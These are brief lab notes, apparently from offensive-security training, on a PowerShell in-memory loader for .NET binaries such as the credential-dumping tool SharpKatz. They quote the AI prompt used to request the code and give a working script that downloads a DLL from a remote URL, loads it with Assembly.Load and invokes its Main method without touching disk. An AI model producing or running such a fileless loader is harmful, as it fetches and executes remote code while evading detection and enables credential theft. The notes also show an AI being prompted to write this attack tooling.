# Lab - PS Loader

# Powershell in-memory loader
> ADVANTAGES of .net binaries -> can be loaded and executed completely in-memory (fileless)

Powershell loader - load assembly (sharpkatz)

> AI PROMPT : write a powershell script that downloads a .dotnet binary from a remote website, and then loads it in memory with loadassembly and execute, without anything touching disk, in as few linnes as possible

```powershell
$binaryUrl = "https://example.com/sample.dll"
$bytes = (New-Object System.Net.WebClient).DownloadData($binaryUrl)
$asm = [System.Reflection.Assembly]::Load($bytes)
$asm.GetType("SampleNamespace.SampleClass").GetMethod("Main").Invoke($null, $null)
```

<https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c>

dot-net execute